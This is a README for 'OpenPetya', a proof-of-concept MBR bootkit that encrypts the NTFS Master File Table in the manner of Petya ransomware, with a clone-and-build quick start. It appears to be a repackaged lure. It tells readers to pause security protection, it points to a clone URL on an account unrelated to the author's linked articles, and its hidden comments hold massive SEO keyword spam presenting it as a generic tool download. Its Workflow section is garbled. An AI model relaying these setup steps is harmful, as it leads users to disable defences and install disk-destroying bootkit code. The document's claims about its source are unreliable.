# OpenPetya


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/brandbowcrucible/OpenPetya-tool.git
cd OpenPetya-tool
mkdir build && cd build
cmake ..
cmake --build . --config Release
```


A Proof-of-Concept bootkit inspired by Petya ransomware, written in Assembly, C, and C++

<p align="center">
    <img src="https://iss4cf0ng.github.io/images/meme/Rio/4.png" width=200/>
</p>

If you find this project helpful or informative, I would truly appreciate a ⭐ on the repository. Your support would be a great motivation for me to continue improving this tool.

# Overview

OpenPetya is an educational project designed to study how bootkits and low-level ransomware operate internally.

<p align="center">
    <img src="https://iss4cf0ng.github.io/images/article/2026-5-23-OpenPetya/5.png" width=700/>
</p>

The project focuses on:
- custom MBR bootloading
- multi-stage boot process
- Protected Mode transition
- NTFS Master File Table (MFT) encryption
- Salsa20-based cryptography
- password validation and restoration workflow

OpenPetya is **NOT** intended to be an exact reimplementation of either Petya or NotPetya. Instead, it is a simplified Proof-of-Concept designed for learning and research purposes.

It is worth mentioning that OpenPetya does not include Command-and-Control (C2) functionality. In addition, OpenPetya stores plaintext MFT backup data inside hidden sectors after encryption. This behavior is intentionally designed for educational purposes because those features are relatively trival compared to the core bootloader and cryptographic mechanisms implemented in this project. However, you can still modify or remove these features if necessary.

---

# Project Motivation

Over the past few months, I have been studying:
- malware analysis
- bootloaders
- rootkits and bootkits
- Windows internals
- operating system fundamentals
- low-level Assembly programming

While researching Petya and NotPetya, I realized that many online resources only briefly explain the overall workflow without demonstrating how the underlying boot process actually works.

In addition, many existing Petya-related projects rely on extracted bootloader binaries or modified original components rather than implementing the logic from scratch.

Therefore, I decided to develop OpenPetya as a practical project for understanding:
- how custom MBR bootkits work
- how stage-2 bootloaders operate
- how disk encryption workflows function
- how password validation and restoration mechanisms are implemented

The project also serves as part of my ongoing research into bootkits, low-level malware, and operating system internals.

Related articles:
- [Analyzing Petya](https://iss4cf0ng.github.io/2026/04/12/2026-4-12-Petya/)
- [Analyzing NotPetya](https://iss4cf0ng.github.io/2026/04/13/2026-4-13-NotPetya/)
- [Simple MBR And Bootloader](https://iss4cf0ng.github.io/2026/04/08/2026-4-8-MbrAndBootLoader/)
- [OpenBootloader](https://iss4cf0ng.github.io/2026/05/10/2026-5-10-OpenBootloader/)
- [Rootkits and Bootkits Notes](https://iss4cf0ng.github.io/2026/04/28/2026-4-28-RootkitAndBootkit/)
- [PC Assembly Language Notes](https://iss4cf0ng.github.io/2026/04/21/2026-4-21-PcAsmLang/)
- [Serious Cryptography Notes](https://iss4cf0ng.github.io/2026/05/16/2026-5-16-SeriousCryptography/)

---

# Features

- **Custom MBR**
  
  OpenPetya uses a custom Master Boot Record (MBR) to load the stage-2 payload.

- **Custom Stage-2 Bootloader**
  
  The stage-2 bootloader contains the core functionality of the project, including:
  - Salsa20 encryption/decryption
  - password validation
  - restoration logic
  - user interface

- **Protected Mode Transition**
  
  The bootloader switches from 16-bit Real Mode to 32-bit Protected Mode before executing higher-level logic.

- **MFT Encryption**
  
  Similar to the original Petya, OpenPetya encrypts critical parts of the NTFS Master File Table (MFT) using Salsa20.

- **Password Validation**
  
  OpenPetya validates the input password before decryption to prevent irreversible corruption caused by invalid keys.

- **Automatic Restoration**
  
  Once the correct password is entered:
  - encrypted data is restored
  - the original boot chain is recovered
  - OpenPetya removes itself automatically

---

# Components

## `OpenPetya.exe`

User-mode installer and controller application.

Functions:
- drive selection
- installation
- reboot triggering
- utility interface

## `mbr.bin`

Custom Master Boot Record (MBR) code responsible for:
- stage-2 loading
- early boot execution

## `stage2.bin`

The core payload of OpenPetya.

Responsibilities:
- Protected Mode transition
- Salsa20 cryptographic operations
- MFT encryption/decryption
- password validation
- restoration
- boot-time interface

---

# Workflow

The workflow of OpenPetya is summarized below.

   - encrypted data is decrypted
   - the original boot chain is restored
   - OpenPetya removes itself automatically

> Unlike the original Petya ransomware, OpenPetya does not attempt to deceive users with fake CHKDSK screens or social engineering behavior. The project is designed purely for educational and research purposes.

---


# Technical Notes

Detailed explanations about:
- MBR boot process
- Real Mode and Protected Mode
- Salsa20 implementation
- MFT encryption workflow
- bootkit design
- More discussions about Petya and NotPetya
- How to use undocumented APIs (such as `NtRaiseHardError`)

Are documented in [this article](https://iss4cf0ng.github.io/2026/05/23/2026-5-23-OpenPetya/).

# Disclaimer

This project was developed purely for educational and research purposes.

The goal of OpenPetya is to study:

- bootkits
- operating system internals
- low-level malware techniques
- bootloader architecture

Do **NOT** use this project for illegal activities or against systems you do not own or explicitly have permission to test.

The author is **NOT** responsible for any misuse of this software.

# Demonstration (Windows 7)

## Screenshots

<p align="center">
    <img src="https://iss4cf0ng.github.io/images/article/2026-5-23-OpenPetya/4.png" width=800/>
</p>


# Future Plans

- Improved recovery workflow
- Better NTFS parsing
- More accurate Petya behavior simulation
- UEFI experiments
- Additional bootkit research
- Full-screen Graphics Mode
- Windows 10 support

# Thanks

Thanks for checking out this project. Feedback and suggestions are welcome.

<!-- c++ cpp cmake native performance library framework windows linux macos -->
<!-- OpenPetya-tool - tool utility software - download install setup -->
<!-- run on linux lightweight OpenPetya-tool | windows OpenPetya-tool | OpenPetya-tool program | centos OpenPetya-tool decoder | use stable OpenPetya-tool | tutorial OpenPetya-tool debugger | arch OpenPetya-tool | OpenPetya tool podcast | OpenPetya-tool checker | how to download OpenPetya-tool server | execute local OpenPetya-tool | zip OpenPetya-tool sdk | execute OpenPetya-tool optimizer | execute online OpenPetya-tool api | OpenPetya-tool clone | wiki OpenPetya-tool | reliable OpenPetya-tool replacement | launch easy OpenPetya-tool plugin | 2025 OpenPetya-tool clone | open source OpenPetya-tool tester | quickstart OpenPetya-tool mirror | lightweight OpenPetya-tool wrapper | documentation production ready OpenPetya-tool | OpenPetya tool kubernetes | offline OpenPetya-tool decoder | open OpenPetya-tool | OpenPetya tool setup | tar.gz OpenPetya-tool creator | fedora OpenPetya-tool mobile | free OpenPetya-tool app | download for windows OpenPetya-tool gui | OpenPetya-tool software | wiki stable OpenPetya-tool addon | updated local OpenPetya-tool gui | OpenPetya tool alternative | how to use OpenPetya-tool service | beginner OpenPetya-tool plugin | install OpenPetya-tool tracker | how to use low latency OpenPetya-tool module | 2025 low latency OpenPetya-tool | free low latency OpenPetya-tool alternative | extensible OpenPetya-tool replacement | free download OpenPetya-tool plugin | documentation OpenPetya-tool clone | how to use OpenPetya-tool viewer | configure OpenPetya-tool engine | documentation OpenPetya-tool replacement | new version low latency OpenPetya-tool utility | execute extensible OpenPetya-tool | how to build OpenPetya-tool gui -->
<!-- fast OpenPetya-tool client | free download OpenPetya-tool package | high performance OpenPetya-tool encoder | latest version OpenPetya-tool scanner | OpenPetya tool demo | github OpenPetya-tool package | arch online OpenPetya-tool | sample OpenPetya-tool | OpenPetya-tool wrapper | fedora OpenPetya-tool app | beginner high performance OpenPetya-tool | production ready OpenPetya-tool | OpenPetya-tool mobile | how to run configurable OpenPetya-tool encoder | offline OpenPetya-tool extension | macos extensible OpenPetya-tool | OpenPetya tool reddit | open self hosted OpenPetya-tool viewer | portable OpenPetya-tool plugin | cross platform OpenPetya-tool editor | configure OpenPetya-tool tool | get OpenPetya-tool viewer | arch OpenPetya-tool debugger | execute easy OpenPetya-tool | zip OpenPetya-tool | latest version OpenPetya-tool alternative | OpenPetya-tool tracker | documentation stable OpenPetya-tool copy | OpenPetya tool example | execute advanced OpenPetya-tool | safe OpenPetya-tool plugin | download for mac OpenPetya-tool decoder | quickstart OpenPetya-tool debugger | new version OpenPetya-tool converter | how to configure stable OpenPetya-tool | OpenPetya-tool alternative | customizable OpenPetya-tool library | cross platform OpenPetya-tool | portable OpenPetya-tool encoder | execute OpenPetya-tool mirror | documentation OpenPetya-tool | secure OpenPetya-tool clone | how to configure reliable OpenPetya-tool | run on windows OpenPetya-tool module | download OpenPetya-tool api | how to use OpenPetya-tool | OpenPetya-tool api | extensible OpenPetya-tool | configurable OpenPetya-tool | local OpenPetya-tool -->
<!-- best OpenPetya tool | online OpenPetya-tool binding | setup portable OpenPetya-tool | getting started OpenPetya-tool server | how to build OpenPetya-tool addon | how to install OpenPetya-tool extension | build OpenPetya-tool desktop | OpenPetya-tool cli | self hosted OpenPetya-tool builder | quick start OpenPetya-tool downloader | reliable OpenPetya-tool port | portable OpenPetya-tool tester | install fast OpenPetya-tool builder | zip OpenPetya-tool client | how to setup configurable OpenPetya-tool | cross platform OpenPetya-tool decoder | wiki OpenPetya-tool mirror | native OpenPetya-tool app | is OpenPetya tool good | low latency OpenPetya-tool | download for linux OpenPetya-tool | customizable OpenPetya-tool validator | tutorial OpenPetya-tool | modern OpenPetya-tool api | open source OpenPetya-tool app | run OpenPetya-tool sdk | simple OpenPetya-tool cli | configurable OpenPetya-tool sdk | how to install OpenPetya-tool package | free OpenPetya-tool editor | how to setup modular OpenPetya-tool encoder | tutorial OpenPetya-tool tracker | OpenPetya-tool tester | OpenPetya-tool uploader | native OpenPetya-tool tester | top OpenPetya-tool desktop | github OpenPetya-tool decoder | run OpenPetya-tool copy | example OpenPetya-tool server | get OpenPetya-tool web | modern OpenPetya-tool tracker | OpenPetya-tool reader | download for linux powerful OpenPetya-tool compressor | setup OpenPetya-tool desktop | sample OpenPetya-tool gui | how to configure customizable OpenPetya-tool gui | best OpenPetya-tool encoder | git clone OpenPetya-tool | OpenPetya tool documentation | macos OpenPetya-tool checker -->
<!-- stable OpenPetya-tool | linux OpenPetya-tool plugin | run on windows OpenPetya-tool tester | tutorial OpenPetya-tool framework | documentation easy OpenPetya-tool | run OpenPetya-tool | OpenPetya-tool monitor | high performance OpenPetya-tool | simple OpenPetya-tool program | linux OpenPetya-tool extractor | safe OpenPetya-tool analyzer | updated OpenPetya-tool monitor | OpenPetya-tool binding | debian OpenPetya-tool uploader | secure OpenPetya-tool engine | example OpenPetya-tool platform | windows production ready OpenPetya-tool | updated OpenPetya-tool replacement | local OpenPetya-tool application | run on windows OpenPetya-tool debugger | docs OpenPetya-tool wrapper | open top OpenPetya-tool analyzer | open source OpenPetya-tool server | free OpenPetya-tool builder | compile OpenPetya-tool package | customizable OpenPetya-tool alternative | how to use OpenPetya-tool editor | open source OpenPetya-tool mobile | OpenPetya tool cloud | how to use OpenPetya-tool gui | quickstart OpenPetya-tool copy | deploy OpenPetya-tool extension | OpenPetya tool saas | easy OpenPetya-tool logger | use OpenPetya-tool web | use OpenPetya-tool checker | install OpenPetya-tool module | tar.gz OpenPetya-tool logger | quick start OpenPetya-tool checker | OpenPetya tool fix | easy OpenPetya-tool desktop | getting started OpenPetya-tool api | lightweight OpenPetya-tool service | wiki OpenPetya-tool tester | open source OpenPetya-tool monitor | windows simple OpenPetya-tool | tutorial OpenPetya-tool program | deploy top OpenPetya-tool viewer | modular OpenPetya-tool mirror | setup minimal OpenPetya-tool framework -->
<!-- secure OpenPetya-tool mobile | run OpenPetya-tool engine | simple OpenPetya-tool decoder | OpenPetya-tool engine | OpenPetya-tool plugin | OpenPetya tool cheat sheet | OpenPetya-tool parser | new version OpenPetya-tool application | best OpenPetya-tool package | OpenPetya-tool package | OpenPetya tool article | examples OpenPetya-tool server | docs OpenPetya-tool alternative | beginner OpenPetya-tool software | secure OpenPetya-tool decoder | self hosted OpenPetya-tool | arch OpenPetya-tool parser | how to download modern OpenPetya-tool | OpenPetya tool blog | OpenPetya-tool decoder | minimal OpenPetya-tool | setup configurable OpenPetya-tool tester | latest version OpenPetya-tool framework | OpenPetya tool bug | beginner OpenPetya-tool program | OpenPetya-tool validator | ubuntu OpenPetya-tool addon | github OpenPetya-tool engine | OpenPetya-tool scanner | tar.gz OpenPetya-tool fork | centos OpenPetya-tool parser | stable OpenPetya-tool package | secure OpenPetya-tool cli | reliable OpenPetya-tool module | zip lightweight OpenPetya-tool api | cross platform OpenPetya-tool generator | extensible OpenPetya-tool logger | execute OpenPetya-tool client | how to download OpenPetya-tool viewer | production ready OpenPetya-tool tool | open OpenPetya-tool fork | OpenPetya-tool compressor | best OpenPetya-tool cli | centos OpenPetya-tool cli | best OpenPetya-tool module | 2026 OpenPetya-tool tracker | tar.gz OpenPetya-tool utility | how to setup OpenPetya-tool server | lightweight OpenPetya-tool validator | open source OpenPetya-tool decoder -->
<!-- examples top OpenPetya-tool program | debian OpenPetya-tool | stable OpenPetya-tool creator | OpenPetya tool not working | demo OpenPetya-tool logger | OpenPetya tool help | examples advanced OpenPetya-tool service | configure easy OpenPetya-tool | use online OpenPetya-tool | download for mac OpenPetya-tool engine | run on linux production ready OpenPetya-tool | git clone OpenPetya-tool decoder | how to run OpenPetya-tool | install open source OpenPetya-tool | start self hosted OpenPetya-tool | run on mac OpenPetya-tool | walkthrough OpenPetya-tool tool | launch OpenPetya-tool creator | quickstart OpenPetya-tool tool | advanced OpenPetya-tool gui | github OpenPetya-tool downloader | advanced OpenPetya-tool | low latency OpenPetya-tool utility | open source OpenPetya-tool | docs OpenPetya-tool logger | deploy low latency OpenPetya-tool | updated OpenPetya-tool extractor | use OpenPetya-tool package | wiki OpenPetya-tool engine | modular OpenPetya-tool logger | guide modern OpenPetya-tool | configure best OpenPetya-tool | OpenPetya-tool port | OpenPetya-tool service | OpenPetya-tool builder | OpenPetya-tool generator | getting started OpenPetya-tool optimizer | deploy advanced OpenPetya-tool | documentation extensible OpenPetya-tool client | online OpenPetya-tool fork | open source OpenPetya-tool alternative | run on mac OpenPetya-tool plugin | OpenPetya tool workshop | top OpenPetya-tool platform | open safe OpenPetya-tool | guide OpenPetya-tool engine | execute OpenPetya-tool logger | examples OpenPetya-tool decoder | github OpenPetya-tool reader | deploy OpenPetya-tool tester -->
<!-- getting started OpenPetya-tool module | OpenPetya-tool module | example extensible OpenPetya-tool module | OpenPetya tool benchmark | high performance OpenPetya-tool gui | getting started native OpenPetya-tool builder | setup OpenPetya-tool wrapper | how to use OpenPetya-tool replacement | updated OpenPetya-tool desktop | free OpenPetya-tool server | windows fast OpenPetya-tool | how to run open source OpenPetya-tool | run OpenPetya-tool web | demo OpenPetya-tool gui | safe OpenPetya-tool validator | portable OpenPetya-tool parser | fedora OpenPetya-tool logger | free OpenPetya-tool | OpenPetya-tool replacement | high performance OpenPetya-tool api | extensible OpenPetya-tool wrapper | download for windows OpenPetya-tool platform | build OpenPetya-tool | how to setup OpenPetya-tool monitor | run on windows OpenPetya-tool | production ready OpenPetya-tool addon | run on linux OpenPetya-tool checker | safe OpenPetya-tool addon | github OpenPetya-tool wrapper | download for linux OpenPetya-tool tracker | free download OpenPetya-tool fork | documentation best OpenPetya-tool | sample OpenPetya-tool service | launch best OpenPetya-tool | macos OpenPetya-tool | stable OpenPetya-tool wrapper | powerful OpenPetya-tool wrapper | download for linux advanced OpenPetya-tool | how to configure top OpenPetya-tool software | portable OpenPetya-tool | OpenPetya-tool downloader | tar.gz fast OpenPetya-tool | how to install OpenPetya-tool | customizable OpenPetya-tool compressor | tar.gz OpenPetya-tool | powerful OpenPetya-tool alternative | open source simple OpenPetya-tool software | production ready OpenPetya-tool tracker | OpenPetya tool course | run github OpenPetya-tool -->
<!-- native OpenPetya-tool clone | start OpenPetya-tool framework | guide OpenPetya-tool program | open OpenPetya-tool generator | portable OpenPetya-tool creator | powerful OpenPetya-tool | low latency OpenPetya-tool analyzer | online OpenPetya-tool decoder | safe OpenPetya-tool | install self hosted OpenPetya-tool | free OpenPetya-tool encoder | reliable OpenPetya-tool binding | install OpenPetya-tool extension | simple OpenPetya-tool | modern OpenPetya-tool service | how to configure OpenPetya-tool application | 2025 low latency OpenPetya-tool sdk | download for mac reliable OpenPetya-tool | source code OpenPetya-tool mobile | ubuntu OpenPetya-tool tracker | OpenPetya-tool viewer | example OpenPetya-tool | open OpenPetya-tool service | setup OpenPetya-tool validator | easy OpenPetya-tool optimizer | quick start OpenPetya-tool utility | reliable OpenPetya-tool platform | OpenPetya tool automation | demo OpenPetya-tool desktop | macos OpenPetya-tool mirror | launch OpenPetya-tool | OpenPetya tool error | get OpenPetya-tool | demo OpenPetya-tool wrapper | compile OpenPetya-tool platform | documentation OpenPetya-tool compressor | production ready OpenPetya-tool compressor | download secure OpenPetya-tool platform | self hosted OpenPetya-tool program | OpenPetya tool devops | tutorial open source OpenPetya-tool parser | modular OpenPetya-tool | powerful OpenPetya-tool uploader | macos OpenPetya-tool desktop | download stable OpenPetya-tool extension | linux OpenPetya-tool reader | minimal OpenPetya-tool encoder | download best OpenPetya-tool | how to build extensible OpenPetya-tool decoder | OpenPetya-tool extractor -->
<!-- macos OpenPetya-tool validator | guide OpenPetya-tool generator | ubuntu customizable OpenPetya-tool platform | secure OpenPetya-tool program | self hosted OpenPetya-tool port | simple OpenPetya-tool library | run on linux OpenPetya-tool scanner | how to run OpenPetya-tool mirror | example best OpenPetya-tool | top OpenPetya tool | OpenPetya-tool logger | start OpenPetya-tool | download OpenPetya-tool | how to install OpenPetya-tool port | download for linux OpenPetya-tool alternative | download for windows OpenPetya-tool tester | advanced OpenPetya-tool encoder | online OpenPetya-tool uploader | source code OpenPetya-tool logger | updated offline OpenPetya-tool port | reliable OpenPetya-tool wrapper | modern OpenPetya-tool gui | wiki production ready OpenPetya-tool | compile OpenPetya-tool binding | quick start OpenPetya-tool client | OpenPetya tool tutorial | github OpenPetya-tool checker | examples OpenPetya-tool addon | macos OpenPetya-tool service | top OpenPetya-tool package | run on linux customizable OpenPetya-tool editor | 2025 OpenPetya-tool package | documentation OpenPetya-tool decoder | configure OpenPetya-tool logger | example OpenPetya-tool service | 2025 native OpenPetya-tool | example OpenPetya-tool gui | lightweight OpenPetya-tool | secure OpenPetya-tool analyzer | updated secure OpenPetya-tool builder | open source OpenPetya-tool cli | how to deploy OpenPetya-tool reader | demo OpenPetya-tool fork | OpenPetya-tool library | deploy OpenPetya-tool monitor | OpenPetya tool support | online OpenPetya-tool mirror | open source OpenPetya-tool optimizer | powerful OpenPetya-tool addon | tutorial OpenPetya-tool extractor -->
<!-- compile OpenPetya-tool | powerful OpenPetya-tool program | sample OpenPetya-tool parser | download for windows OpenPetya-tool | beginner OpenPetya-tool package | configurable OpenPetya-tool application | low latency OpenPetya-tool reader | download for mac OpenPetya-tool downloader | open source OpenPetya-tool program | arch OpenPetya-tool copy | free OpenPetya-tool replacement | how to build OpenPetya-tool program | OpenPetya-tool desktop | free download minimal OpenPetya-tool | use OpenPetya-tool alternative | sample OpenPetya-tool tool | high performance OpenPetya-tool parser | windows OpenPetya-tool platform | customizable OpenPetya-tool | offline OpenPetya-tool clone | walkthrough OpenPetya-tool platform | 2026 OpenPetya-tool alternative | extensible OpenPetya-tool decoder | how to setup OpenPetya-tool port | OpenPetya-tool tool | sample OpenPetya-tool converter | download for linux OpenPetya-tool analyzer | how to deploy OpenPetya-tool api | how to setup OpenPetya-tool utility | new version OpenPetya-tool parser | self hosted OpenPetya-tool package | how to install offline OpenPetya-tool | powerful OpenPetya-tool analyzer | updated OpenPetya-tool utility | get OpenPetya-tool compressor | offline OpenPetya-tool parser | debian OpenPetya-tool extractor | beginner OpenPetya-tool addon | OpenPetya tool download | modern OpenPetya-tool cli | run on mac OpenPetya-tool client | git clone OpenPetya-tool binding | execute simple OpenPetya-tool scanner | easy OpenPetya-tool plugin | macos online OpenPetya-tool | OpenPetya tool docker | OpenPetya tool test | advanced OpenPetya-tool compressor | download for windows OpenPetya-tool scanner | fast OpenPetya-tool compressor -->

<!-- Last updated: 2026-06-09 19:18:35 -->
